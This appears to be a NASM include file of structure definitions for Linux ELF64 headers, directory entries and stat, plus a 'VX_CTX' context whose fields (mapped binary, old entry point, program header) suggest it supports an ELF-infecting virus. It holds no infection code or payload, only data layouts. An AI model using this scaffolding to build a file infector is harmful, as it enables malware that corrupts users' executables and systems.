
struc VX_CTX   
    .qMappedBin    resq 0x01  ; 0x00
    .qFileSize     resq 0x01  ; 0x08
    .qOldEntry     resq 0x01  ; 0x10
    .qPrgHdr       resq 0x01  ; 0x18
    .qEof          resq 0x01  ; 0x20
endstruc

struc linux_dirent64
    .d_ino          resq 0x01
    .d_off          resq 0x01
    .d_reclen       resw 0x01
    .d_type         resb 0x01
    .d_name         resb 0x01
endstruc

struc stat
    .st_dev         resq 0x01
    .st_ino         resq 0x01
    .st_nlink       resq 0x01
    .st_mode        resd 0x01
    .st_uid         resd 0x01
    .st_gid         resd 0x01
    .padding        resb 0x04
    .st_rdev        resq 0x01
    .st_size        resq 0x01
    .st_dontcare    resb 0x58
endstruc

%define STAT_SIZE 144

; this one I did myself!!
struc elf64_hdr
    .e_ident        resb 0x10 ; ELF Magic and other good stuff :)
    .e_type         resw 0x01
    .e_machine      resw 0x01
    .e_version      resd 0x01
    .e_entry        resq 0x01 ; Entry :3
    .e_phoff        resq 0x01 ; Wow a program header offset
    .e_shoff        resq 0x01 ; Wow++ a section header offset
    .e_flags        resd 0x01
    .e_ehsize       resw 0x01
    .e_phentsize    resw 0x01 ; sizeof(program_header)
    .e_phnum        resw 0x01 ; num of program headers
    .e_shentsize    resw 0x01 ; sizeof(section header)
    .e_shnum        resw 0x01 ; num of section headers
    .e_shstrndx     resw 0x01 ; section header string table index
endstruc

%define ELFHDR64_SIZE 64

struc elf64_phdr
    .p_type         resd 0x01 ; type of phdr
    .p_flags        resd 0x01 ; flags
    .p_offset       resq 0x01 ; offset to data
    .p_vaddr        resq 0x01 ; put the segment here
    .p_paddr        resq 0x01 ; undefined for sysv
    .p_filesz       resq 0x01 ; size of segment in file
    .p_memsz        resq 0x01 ; size of segment in memory
    .p_align        resq 0x01 ; required alignment
endstruc

%define PRGHDR64_SIZE 56

struc elf64_shdr
  .sh_name          resd 0x01
  .sh_type          resd 0x01
  .sh_flags         resq 0x01
  .sh_addr          resq 0x01
  .sh_offset        resq 0x01
  .sh_size          resq 0x01
  .sh_link          resd 0x01
  .sh_info          resd 0x01
  .sh_addralign     resq 0x01
  .sh_entsize       resq 0x01
endstruc

%define SCTHDR64_SIZE 64

